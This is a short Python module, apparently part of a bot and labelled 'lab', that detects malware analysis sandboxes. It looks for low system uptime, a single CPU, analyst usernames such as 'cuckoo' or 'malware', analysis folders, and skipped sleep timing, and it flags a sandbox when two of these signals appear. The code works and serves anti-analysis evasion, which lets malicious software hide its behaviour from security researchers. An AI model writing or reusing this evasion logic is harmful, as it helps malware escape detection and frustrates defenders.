"""bot/anti_sandbox.py — sandbox / analysis environment heuristics (lab)"""
import os
import platform
import time
from pathlib import Path
from typing import Dict, List


def is_sandbox() -> bool:
    return detect().get("is_sandbox", False)


def detect() -> Dict:
    signals: List[str] = []
    # low uptime
    try:
        up = float(Path("/proc/uptime").read_text().split()[0])
        if up < 120:
            signals.append(f"low_uptime={up:.0f}s")
    except Exception:
        pass
    # few CPUs / low RAM (weak)
    try:
        cpus = os.cpu_count() or 1
        if cpus <= 1:
            signals.append("cpus<=1")
    except Exception:
        pass
    # known sandbox usernames
    user = os.environ.get("USER") or os.environ.get("USERNAME") or ""
    for u in ("sandbox", "malware", "virus", "sample", "cuckoo", "analyze"):
        if u in user.lower():
            signals.append(f"user:{user}")
    # temp path markers
    for p in ("/tmp/cuckoo", "/tmp/analysis", "C:\\\\analysis"):
        if Path(p).exists():
            signals.append(f"path:{p}")
    # timing anomaly (sleep drift) — light
    t0 = time.time()
    time.sleep(0.05)
    drift = time.time() - t0
    if drift < 0.03:
        signals.append("sleep_skip")
    return {
        "is_sandbox": len(signals) >= 2,
        "signals": signals,
        "os": platform.system(),
    }
